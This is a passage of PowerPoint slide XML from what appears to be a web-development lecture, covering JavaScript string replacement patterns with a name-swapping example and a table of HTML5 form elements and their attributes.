                        <a:t>$&amp;</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Inserts the matched substring</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2683704761"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>$`</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Inserts the portion of the string that precedes the matched substring</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4230717972"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>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Inserts the portion of the string that follows the matched substring</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="870606844"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>$n</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Inserts nth (positive integer) parenthesized substring</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1894325149"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>$&lt;Name&gt;</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Inserts the named capturing subgroup</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1796839829"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Sisällön paikkamerkki 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D649B9EC-8640-4192-AAEF-59F2F9EBE4F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="4293096"/>
            <a:ext cx="10972800" cy="1833068"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>let</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>'Petri Kuittinen'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>let</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>replace</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D16969"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>\w</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D16969"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>\s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D16969"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>\w</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D16969"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>'$2, $1'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>console</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>log</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>s</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"Kuittinen, Petri"</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11330729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4CA4E96C-AE35-4B37-A4CC-296457209B3F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>HTML5 Form Elements</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2364BE4F-6F79-4BE8-92F3-1C6E2B500387}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="550863" y="1398588"/>
          <a:ext cx="11031537" cy="4821232"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1326557">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20000"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3743931">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20001"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="5961049">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20002"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="370864">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Element</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Description</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Essential Attributes</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10000"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370864">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>&lt;form&gt;</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Defines an HTML form for user input</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>action, method, </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>novalidate</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>, autocomplete</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10001"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370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&lt;input&gt;</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>an input control (multiple types)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>type, id, autofocus, placeholder, checked, required, value</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10002"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370864">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>&lt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>textarea</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>&gt;</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>a multiline input control (</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>textarea</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>rows, cols, id</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10003"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370864">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>&lt;label&gt;</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>a label for an input element</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>for</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10004"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370864">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>&lt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>fieldset</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>&gt;</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Groups related elements in a form</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10005"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370864">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>&lt;legend&gt;</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 caption for a &lt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>fieldset</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>&gt; element</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91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10006"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370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&lt;select&gt;</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>a drop-down list</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>multiple, id, required, size</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10007"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370864">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>&lt;</a:t>
                      </a:r>
                      <a:r>
